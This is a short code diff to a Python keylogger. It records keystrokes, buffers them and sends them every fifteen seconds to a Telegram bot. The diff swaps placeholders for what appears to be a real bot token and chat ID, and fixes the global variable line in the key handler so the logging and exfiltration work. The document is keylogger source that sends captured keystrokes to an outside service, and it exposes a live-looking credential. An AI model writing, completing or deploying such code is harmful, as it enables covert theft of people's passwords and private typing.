@@ -12,8 +12,8 @@ def send_to_telegram(token, chat_id, message):
         print(f"Error sending message to Telegram: {e}")
 
 # add telegram bot detail here
-TELEGRAM_TOKEN = "INSTERT BOT TOKEN HERE"
-CHAT_ID = "INSERT BOT CHAT ID HERE"
+TELEGRAM_TOKEN = "8070198719:AAFrhG-2O94MNRZD8P7Mr9STwka_kZAtGbY"
+CHAT_ID = "7562247827"
 
 # buffer to store key logs to increase performance
 log_buffer = []
@@ -23,7 +23,7 @@ SEND_INTERVAL = 15
 last_sent_time = time.time()
 
 def key_pressed(key):
-    last_sent_time = 0, log_buffer = 0
+    global last_sent_time, log_buffer
     try:
         char = key.char
         if char:
